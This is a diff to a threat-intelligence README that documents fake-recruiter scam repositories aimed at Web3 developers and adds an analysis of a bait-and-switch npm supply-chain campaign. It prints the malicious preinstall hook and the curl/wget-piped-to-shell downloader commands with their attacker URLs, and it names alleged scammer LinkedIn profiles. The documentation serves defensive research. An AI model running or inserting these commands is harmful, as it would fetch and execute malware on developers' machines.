@@ -53,6 +53,8 @@ The code is kept for educational and research purposes only.
   - [13. Web3Game Project](#13-web3game-project)
   - [14. Real Estate Platform MVP v1 (J-Soft Labs / Janice Bennett variant)](#14-real-estate-platform-mvp-v1-j-soft-labs--janice-bennett-variant)
   - [15. Test Project](#15-test-project)
+  - [16. ACNPlay-Demo (0xroaman Campaign)](#16-acnplay-demo-0xroaman-campaign)
+  - [17. Novaremix Vault (novaremix-vault-zoom)](#17-novaremix-vault-novaremix-vault-zoom)
 - [Checking for Malicious npm Packages](#checking-for-malicious-npm-packages)
 
 ## Known Scam Repos and APIs
@@ -76,6 +78,8 @@ The code is kept for educational and research purposes only.
 - https://github.com/Peiko-Tech-Org/Peiko-Platform-MVP/
 - https://github.com/AgencySoft-LLC/AssetForge/
 - https://github.com/aitech-nexus/ACNPlay-Demo
+- https://everydaynodechecker-39147n.vercel.app/api/key
+- https://novaremix.com
   
 ### Known scammer recruiter profiles
 
@@ -101,6 +105,7 @@ The code is kept for educational and research purposes only.
 - [Janice Bennett](https://www.linkedin.com/in/janice-bennett5873033/) ("Senior Recruiter | Web3 & Crypto @ J-Soft Labs")
 - [Daniel Feit DMD CAGS MS FICD](https://www.linkedin.com/in/daniel-feit-dmd-cags-ms-ficd-90943937/) (hijacked dental professional profile, headline changed to "CTO at J-Soft Labs")
 - [Cecilia Díaz Cruz](https://www.linkedin.com/in/ceciliadic/) (Innovation Lead & Executive | Co-Founder & CEO | IT & Business Strategy Management)
+- [Karem Emad](https://www.linkedin.com/in/karem-emad-813927402)
 
 ## Extra Links
 
@@ -849,6 +854,50 @@ executor(require);
 A full 12-part technical and forensic audit detailing the infrastructure, malware deconstruction, and Threat Intel for this specific repository is available on LinkedIn: [I Almost Got Owned By a Fake Web3 Poker "Demo" (Forensic Series)](https://lnkd.in/dpdMgVgc).
 
 > ⚠️ **DO NOT RUN.** This directory contains neutralized, but highly dangerous code samples preserved in the `.MALWARE-QUARANTINE/` folder. Inspect it for research and analysis purposes only.
+
+---
+
+### 17. Novaremix Vault (novaremix-vault-zoom)
+
+Targeting Web3 / DeFi developers via LinkedIn social engineering and a staged bait-and-switch supply chain attack.
+
+Located in `novaremix-vault-zoom/` directory.
+
+**Scammer / Recruiter Details:**
+- **Recruiter Profile:** [Karem Emad](https://www.linkedin.com/in/karem-emad-813927402)
+- **Claimed Platform:** *Novaremix Vault* (`novaremix.com` - claimed open-source secrets management platform)
+- **Repo Directory:** `novaremix-vault-zoom/`
+
+**Attack Vector & Technical Analysis:**
+
+This campaign uses a psychological **two-phase bait-and-switch** strategy designed to bypass developer code reviews:
+
+1. **Phase 1 (Trust Building):**
+   - The initial repository invitation sent to the victim contains clean code with no malicious scripts or lifecycle hooks.
+   - Includes reassuring fake documentation (e.g. `docs/SAFE-RUN.md`) explicitly promising that no `preinstall` / `postinstall` scripts or remote fetches exist.
+   - Builds developer confidence and trust during the initial review.
+
+2. **Phase 2 (Staged Payload Delivery):**
+   - The victim is re-invited to an updated version of the repository.
+   - A hidden `preinstall` lifecycle script is injected into a nested subpackage `package.json` (`packages/console/package.json`):
+     ```json
+     "scripts": {
+       "preinstall": "node -e \"(async()=>eval(await fetch('https://everydaynodechecker-39147n.vercel.app/api/key?mem=root0').then(r=>r.text())))();\""
+     }
+     ```
+
+3. **Stage-1 Remote Dropper Execution:**
+   - When `npm install` runs, the `preinstall` hook executes an inline Node.js script fetching remote JavaScript from `https://everydaynodechecker-39147n.vercel.app/api/key?mem=root0` and executing it via `eval()`.
+   - The fetched loader script creates a hidden marker file `.git-checker` (containing `"g42319"`) in system temp directory (`os.tmpdir()`), detects the host OS, and silently spawns a platform-specific shell downloader:
+     - **macOS:** `curl -s https://everydaynodechecker-39147n.vercel.app/api/m | sh`
+     - **Linux:** `wget -qO- https://everydaynodechecker-39147n.vercel.app/api/l | sh`
+     - **Windows:** `curl -s https://everydaynodechecker-39147n.vercel.app/api/w | cmd`
+
+**Key Takeaways:**
+- **Dynamic Delivery:** The repository acts as a lightweight delivery mechanism rather than carrying the payload directly, allowing attackers to modify remote payloads without Git commits.
+- **Social Engineering:** Relies on exploiting trust built through clean initial repository reviews.
+
+> ⚠️ **DO NOT RUN.** This directory contains live/quarantined malicious code. Inspect it for research and security analysis purposes only — do not execute it or install its dependencies.
 
 ---
 
